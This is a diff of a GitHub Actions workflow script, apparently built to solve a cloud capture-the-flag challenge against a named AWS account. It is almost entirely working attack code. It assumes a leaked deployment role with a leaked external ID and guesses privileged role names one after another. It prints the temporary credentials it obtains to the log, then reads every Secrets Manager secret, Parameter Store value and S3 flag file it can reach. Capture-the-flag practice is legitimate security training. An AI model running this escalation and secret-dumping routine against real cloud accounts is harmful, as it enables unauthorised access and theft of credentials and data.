@@ -235,124 +235,128 @@ jobs:
         echo "=== Searching for IAM roles ==="
         aws iam list-roles --query 'Roles[?contains(RoleName, `privilege`) || contains(RoleName, `admin`) || contains(RoleName, `elevated`) || contains(RoleName, `secret`)].[RoleName,Arn]' --output table || echo "Cannot list roles"
         
-        # Try the most likely role names based on all our clues
-        POTENTIAL_ROLES=(
-          "arn:aws:iam::170974506515:role/audit"
-          "arn:aws:iam::170974506515:role/auditor"
-          "arn:aws:iam::170974506515:role/admin"
-          "arn:aws:iam::170974506515:role/maintenance"
-          "arn:aws:iam::170974506515:role/diagnostics"
-          "arn:aws:iam::170974506515:role/hexnova"
-          "arn:aws:iam::170974506515:role/vault"
-          "arn:aws:iam::170974506515:role/elevated"
-          "arn:aws:iam::170974506515:role/privileged"
-          "arn:aws:iam::170974506515:role/weekly"
-          "arn:aws:iam::170974506515:role/secrets"
-          "arn:aws:iam::170974506515:role/hexnova404"
-        )
+        # The leaked Role_arn was github-deployment-role
+        # Maybe we need to assume the SAME role again but with the external_id?
+        TARGET_ROLE="arn:aws:iam::170974506515:role/github-deployment-role"
         
-        # Try different approaches for each role
-        for ROLE_ARN in "${POTENTIAL_ROLES[@]}"; do
-          echo ""
-          echo "=== Testing role: $ROLE_ARN ==="
-          
-          # Method 1: With original external_id
-          echo "1. Trying with external_id: $EXTERNAL_ID"
-          if aws sts assume-role \
-            --role-arn "$ROLE_ARN" \
-            --role-session-name "CTF-Investigation" \
-            --external-id "$EXTERNAL_ID" \
-            --output json > /tmp/creds.json 2>/dev/null; then
-            echo "✅ SUCCESS with external_id!"
-            cat /tmp/creds.json
-            break
-          fi
-          
-          # Method 2: With modified external_id (without extid prefix)
-          MODIFIED_EXTERNAL_ID="${EXTERNAL_ID:5}"  # Remove "extid" prefix
-          echo "2. Trying with modified external_id: $MODIFIED_EXTERNAL_ID"
-          if aws sts assume-role \
-            --role-arn "$ROLE_ARN" \
-            --role-session-name "CTF-Investigation" \
-            --external-id "$MODIFIED_EXTERNAL_ID" \
-            --output json > /tmp/creds.json 2>/dev/null; then
-            echo "✅ SUCCESS with modified external_id!"
-            cat /tmp/creds.json
-            break
-          fi
-          
-          # Method 3: Without external_id
-          echo "3. Trying WITHOUT external_id"
-          if aws sts assume-role \
-            --role-arn "$ROLE_ARN" \
-            --role-session-name "CTF-Investigation" \
-            --output json > /tmp/creds.json 2>/dev/null; then
-            echo "✅ SUCCESS without external_id!"
-            cat /tmp/creds.json
-            break
-          fi
-          
-          # Method 4: Try with just "HX" as external_id
-          echo "4. Trying with HX as external_id"
-          if aws sts assume-role \
-            --role-arn "$ROLE_ARN" \
-            --role-session-name "CTF-Investigation" \
-            --external-id "HX" \
-            --output json > /tmp/creds.json 2>/dev/null; then
-            echo "✅ SUCCESS with HX!"
-            cat /tmp/creds.json
-            break
-          fi
-          
-          echo "❌ All methods failed for $ROLE_ARN"
-        done
+        echo "=== Testing the github-deployment-role with external_id ==="
+        echo "Current role: $(aws sts get-caller-identity --query Arn --output text)"
+        echo "Target role: $TARGET_ROLE"
+        echo "External ID: $EXTERNAL_ID"
         
-        # If we got here and have creds, use them
-        if [ -f /tmp/creds.json ] && [ -s /tmp/creds.json ]; then
-          echo ""
-          echo "=== Using elevated credentials ==="
+        # Try to assume the github-deployment-role again, but with external_id
+        echo ""
+        echo "Attempting to assume github-deployment-role WITH external_id..."
+        if aws sts assume-role \
+          --role-arn "$TARGET_ROLE" \
+          --role-session-name "ElevatedSession" \
+          --external-id "$EXTERNAL_ID" \
+          --output json > /tmp/elevated_creds.json 2>/dev/null; then
+          
+          echo "✅ SUCCESS! Assumed github-deployment-role with external_id!"
+          cat /tmp/elevated_creds.json | jq .
           
           # Export new credentials
-          export AWS_ACCESS_KEY_ID=$(cat /tmp/creds.json | jq -r '.Credentials.AccessKeyId')
-          export AWS_SECRET_ACCESS_KEY=$(cat /tmp/creds.json | jq -r '.Credentials.SecretAccessKey')
-          export AWS_SESSION_TOKEN=$(cat /tmp/creds.json | jq -r '.Credentials.SessionToken')
+          export AWS_ACCESS_KEY_ID=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.AccessKeyId')
+          export AWS_SECRET_ACCESS_KEY=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.SecretAccessKey') 
+          export AWS_SESSION_TOKEN=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.SessionToken')
           
-          echo "New identity:"
+          echo ""
+          echo "New elevated identity:"
           aws sts get-caller-identity
           
-          # Search for flags
+        else
+          echo "❌ Failed to assume github-deployment-role with external_id"
           echo ""
-          echo "=== SEARCHING FOR FLAGS ==="
+          echo "=== Trying other potential roles ==="
           
-          # S3 buckets
-          echo "--- S3 ---"
-          aws s3 ls 2>/dev/null && echo "S3 buckets found!" || echo "No S3 access"
+          POTENTIAL_ROLES=(
+            "arn:aws:iam::170974506515:role/audit"
+            "arn:aws:iam::170974506515:role/auditor"
+            "arn:aws:iam::170974506515:role/admin"
+            "arn:aws:iam::170974506515:role/maintenance"
+            "arn:aws:iam::170974506515:role/diagnostics"
+            "arn:aws:iam::170974506515:role/hexnova"
+            "arn:aws:iam::170974506515:role/vault"
+            "arn:aws:iam::170974506515:role/elevated"
+            "arn:aws:iam::170974506515:role/privileged"
+            "arn:aws:iam::170974506515:role/weekly"
+            "arn:aws:iam::170974506515:role/secrets"
+            "arn:aws:iam::170974506515:role/hexnova404"
+          )
           
-          # Try to access the original S3 bucket with elevated permissions
-          aws s3 ls s3://atr3404-63428fb6/ 2>/dev/null && echo "Can access original bucket!" || echo "Cannot access original bucket"
+          for ROLE_ARN in "${POTENTIAL_ROLES[@]}"; do
+            echo "Testing: $ROLE_ARN"
+            if aws sts assume-role \
+              --role-arn "$ROLE_ARN" \
+              --role-session-name "ElevatedSession" \
+              --external-id "$EXTERNAL_ID" \
+              --output json > /tmp/elevated_creds.json 2>/dev/null; then
+              
+              echo "✅ SUCCESS! Assumed $ROLE_ARN"
+              break
+            fi
+          done
+        fi
+        
+        # If we have elevated credentials, search for the flag
+        if [ -f /tmp/elevated_creds.json ] && [ -s /tmp/elevated_creds.json ]; then
+          echo ""
+          echo "=== SEARCHING FOR FLAGS WITH ELEVATED PERMISSIONS ==="
           
-          # Look for new buckets
+          # Export credentials if not already done
+          export AWS_ACCESS_KEY_ID=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.AccessKeyId')
+          export AWS_SECRET_ACCESS_KEY=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.SecretAccessKey')
+          export AWS_SESSION_TOKEN=$(cat /tmp/elevated_creds.json | jq -r '.Credentials.SessionToken')
+          
+          echo "Current identity:"
+          aws sts get-caller-identity
+          
+          # Check S3 with elevated permissions
+          echo ""
+          echo "--- S3 Buckets ---"
+          aws s3 ls 2>/dev/null || echo "No S3 access"
+          
+          # Try the original bucket with elevated permissions
+          echo ""
+          echo "Checking original bucket with elevated permissions:"
+          aws s3 ls s3://atr3404-63428fb6/ 2>/dev/null || echo "Still cannot access original bucket"
+          
+          # Look for new buckets or objects
           for bucket in $(aws s3 ls | awk '{print $3}' 2>/dev/null); do
-            echo "Checking bucket: $bucket"
+            echo ""
+            echo "=== Bucket: $bucket ==="
             aws s3 ls s3://$bucket/ --recursive 2>/dev/null | head -20
             
-            # Look for flag files
+            # Try to get flag files
+            echo "Looking for flag files in $bucket..."
             aws s3 cp s3://$bucket/flag.txt - 2>/dev/null && echo "" || true
-            aws s3 cp s3://$bucket/flag - 2>/dev/null && echo "" || true
+            aws s3 cp s3://$bucket/flag - 2>/dev/null && echo "" || true  
             aws s3 cp s3://$bucket/FLAG - 2>/dev/null && echo "" || true
+            aws s3 cp s3://$bucket/flag.json - 2>/dev/null && echo "" || true
           done
           
-          # Additional secrets
+          # Check additional secrets with elevated permissions
           echo ""
           echo "--- Additional Secrets ---"
-          aws secretsmanager list-secrets 2>/dev/null || echo "No secrets access"
+          aws secretsmanager list-secrets 2>/dev/null || echo "No additional secrets access"
           
-          # Parameter Store
+          # Try to read all available secrets
+          aws secretsmanager list-secrets 2>/dev/null | jq -r '.SecretList[].Name' | while read secret_name; do
+            if [ ! -z "$secret_name" ]; then
+              echo ""
+              echo "Secret: $secret_name"
+              aws secretsmanager get-secret-value --secret-id "$secret_name" --query SecretString --output text 2>/dev/null || echo "Cannot read this secret"
+            fi
+          done
+          
+          # Check Parameter Store
           echo ""
           echo "--- Parameter Store ---"
           aws ssm get-parameters-by-path --path "/" --recursive 2>/dev/null || echo "No parameter store access"
           
         else
           echo ""
-          echo "❌ No role assumption succeeded"
+          echo "❌ No elevated role assumption succeeded"
+          echo "Current permissions are limited to the github-deployment-role via OIDC"
         fi
